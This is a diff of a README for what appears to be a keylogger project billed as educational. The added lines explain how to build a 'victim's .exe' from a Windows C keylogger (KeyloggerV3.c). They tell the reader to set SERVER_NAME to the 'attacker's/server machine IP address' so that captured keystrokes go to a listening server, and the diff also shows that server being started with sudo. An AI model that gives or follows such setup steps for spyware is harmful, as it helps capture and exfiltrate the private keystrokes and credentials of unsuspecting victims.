@@ -43,7 +43,16 @@ This project is built strictly for **educational and security research purposes*
 ```bash
 sudo python3 server.py
 ```
-📌 Client (Windows C program)
+📌 GENERATING ViCTIM's .exe (Windows C program)
+
+ Configure the Client (Windows Keylogger)
+Before compiling the C program, edit the following line in KeyloggerV3.c:
+
+```c
+
+#define SERVER_NAME L"192.168.43.178"
+```
+➡️ Replace 192.168.43.178 with your attacker's/server machine IP address.
 Compile using:
 
 ```bash
